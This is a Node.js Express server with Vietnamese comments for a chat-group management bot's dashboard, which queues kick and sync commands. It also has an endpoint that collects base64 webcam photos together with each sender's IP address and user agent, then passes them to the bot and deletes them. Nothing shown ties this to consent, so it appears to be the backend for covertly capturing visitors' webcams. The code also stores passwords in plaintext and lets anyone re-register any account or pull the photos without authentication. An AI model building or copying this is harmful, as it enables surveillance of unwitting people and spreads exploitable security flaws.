const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// Increase JSON limit for base64 images
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// ========== DATA (mỗi code riêng biệt) ==========
const accounts = {};
const kickQueue = {};
const loadQueue = {};
const forceSyncQueue = {};
const clearTimeQueue = {};
const botStatus = {};

// Folder lưu ảnh webcam tạm thời
const webcamFolder = path.join(__dirname, 'webcam_temp');
if (!fs.existsSync(webcamFolder)) {
    fs.mkdirSync(webcamFolder, { recursive: true });
}

// ========== PAGES ==========
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));

// ========== AUTH ==========
app.post('/api/login', (req, res) => {
    const { code, password } = req.body;
    const acc = accounts[code];
    if (!acc || acc.password !== password) {
        return res.json({ success: false, message: 'Sai code hoặc password' });
    }
    res.json({ success: true });
});

// ========== DATA API ==========
app.get('/api/groups', (req, res) => {
    const { code } = req.query;
    if (!accounts[code]) return res.json({ success: false });
    res.json({ success: true, groups: accounts[code].groups || {} });
});

app.get('/api/members', (req, res) => {
    const { code, groupId } = req.query;
    if (!accounts[code]) return res.json({ success: false });
    res.json({ success: true, members: accounts[code].members?.[groupId] || [] });
});

app.get('/api/status', (req, res) => {
    const { code } = req.query;
    const last = botStatus[code];
    res.json({ success: true, connected: last && (Date.now() - last) < 60000 });
});

// ========== ACTIONS ==========
app.post('/api/kick', (req, res) => {
    const { code, groupId, memberId, memberName } = req.body;
    if (!accounts[code]) return res.json({ success: false });
    if (!kickQueue[code]) kickQueue[code] = [];
    kickQueue[code].push({ groupId, memberId, memberName });
    res.json({ success: true, message: `Đã gửi lệnh kick ${memberName}` });
});

app.post('/api/loaddata', (req, res) => {
    const { code, groupId } = req.body;
    if (!accounts[code]) return res.json({ success: false });
    if (!loadQueue[code]) loadQueue[code] = [];
    loadQueue[code].push({ groupId });
    res.json({ success: true });
});

app.post('/api/forceSync', (req, res) => {
    const { code, groupId } = req.body;
    if (!accounts[code]) return res.json({ success: false });
    if (!forceSyncQueue[code]) forceSyncQueue[code] = [];
    forceSyncQueue[code].push({ groupId, timestamp: Date.now() });
    res.json({ success: true, message: 'Đã gửi yêu cầu sync' });
});

app.post('/api/clearTime', (req, res) => {
    const { code, groupId } = req.body;
    if (!accounts[code]) return res.json({ success: false });
    if (!clearTimeQueue[code]) clearTimeQueue[code] = [];
    clearTimeQueue[code].push({ groupId, timestamp: Date.now() });
    res.json({ success: true, message: 'Đã gửi yêu cầu xóa dữ liệu' });
});

// Webcam capture endpoint - LƯU VÀO FILE
app.post('/api/webcam-capture', (req, res) => {
    const { image, timestamp, userAgent } = req.body;
    if (!image) return res.json({ success: false });

    try {
        // Tạo file name unique
        const fileName = `webcam_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const imagePath = path.join(webcamFolder, `${fileName}.jpg`);
        const metaPath = path.join(webcamFolder, `${fileName}.json`);

        // Lưu ảnh (base64 -> file)
        const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
        fs.writeFileSync(imagePath, base64Data, 'base64');

        // Lưu metadata
        const meta = {
            timestamp: timestamp || new Date().toISOString(),
            userAgent: userAgent || 'Unknown',
            ip: req.ip || req.headers['x-forwarded-for'] || 'Unknown',
            imagePath: imagePath
        };
        fs.writeFileSync(metaPath, JSON.stringify(meta, null, 2));

        console.log(`[WEBCAM] Saved photo: ${fileName} (waiting for bot)`);
        res.json({ success: true, message: 'Ảnh đã được lưu, đợi bot online để gửi' });
    } catch (e) {
        console.log(`[WEBCAM] Error saving: ${e.message}`);
        res.json({ success: false, message: e.message });
    }
});

// ========== BOT API ==========
app.post('/bot/register', (req, res) => {
    const { code, password } = req.body;
    accounts[code] = { password, groups: {}, members: {} };
    kickQueue[code] = [];
    loadQueue[code] = [];
    res.json({ success: true });
});

app.post('/bot/update', (req, res) => {
    const { code, groups, members } = req.body;
    if (!accounts[code]) accounts[code] = { password: '', groups: {}, members: {} };
    if (groups) accounts[code].groups = groups;
    if (members) accounts[code].members = members;
    botStatus[code] = Date.now();
    res.json({ success: true });
});

app.get('/bot/kicks', (req, res) => {
    const { code } = req.query;
    const kicks = kickQueue[code] || [];
    kickQueue[code] = [];
    res.json({ success: true, kicks });
});

app.get('/bot/loads', (req, res) => {
    const { code } = req.query;
    const loads = loadQueue[code] || [];
    loadQueue[code] = [];
    res.json({ success: true, loads });
});

app.get('/bot/forceSyncs', (req, res) => {
    const { code } = req.query;
    const syncs = forceSyncQueue[code] || [];
    forceSyncQueue[code] = [];
    res.json({ success: true, syncs });
});

app.get('/bot/clearTimes', (req, res) => {
    const { code } = req.query;
    const clears = clearTimeQueue[code] || [];
    clearTimeQueue[code] = [];
    res.json({ success: true, clears });
});

// Bot lấy ảnh webcam - ĐỌC TỪ FILE VÀ XÓA SAU KHI GỬI
app.get('/bot/webcams', (req, res) => {
    try {
        const photos = [];
        const files = fs.readdirSync(webcamFolder);
        const metaFiles = files.filter(f => f.endsWith('.json'));

        for (const metaFile of metaFiles) {
            try {
                const metaPath = path.join(webcamFolder, metaFile);
                const meta = JSON.parse(fs.readFileSync(metaPath, 'utf8'));
                const imagePath = meta.imagePath;

                if (fs.existsSync(imagePath)) {
                    // Đọc ảnh thành base64
                    const imageData = fs.readFileSync(imagePath, 'base64');
                    photos.push({
                        image: `data:image/jpeg;base64,${imageData}`,
                        timestamp: meta.timestamp,
                        userAgent: meta.userAgent,
                        ip: meta.ip
                    });

                    // Xóa file sau khi đọc
                    fs.unlinkSync(imagePath);
                    fs.unlinkSync(metaPath);
                    console.log(`[WEBCAM] Sent & deleted: ${metaFile}`);
                }
            } catch (e) {
                console.log(`[WEBCAM] Error reading ${metaFile}: ${e.message}`);
            }
        }

        res.json({ success: true, photos, count: photos.length });
    } catch (e) {
        res.json({ success: true, photos: [], count: 0 });
    }
});

// API kiểm tra số ảnh đang chờ
app.get('/api/webcam-pending', (req, res) => {
    try {
        const files = fs.readdirSync(webcamFolder);
        const count = files.filter(f => f.endsWith('.json')).length;
        res.json({ success: true, pending: count });
    } catch (e) {
        res.json({ success: true, pending: 0 });
    }
});

// ========== HEALTH ==========
app.get('/health', (req, res) => res.json({ status: 'ok' }));
app.get('/ping', (req, res) => res.send('pong'));

app.listen(PORT, () => console.log(`Server: ${PORT}`));
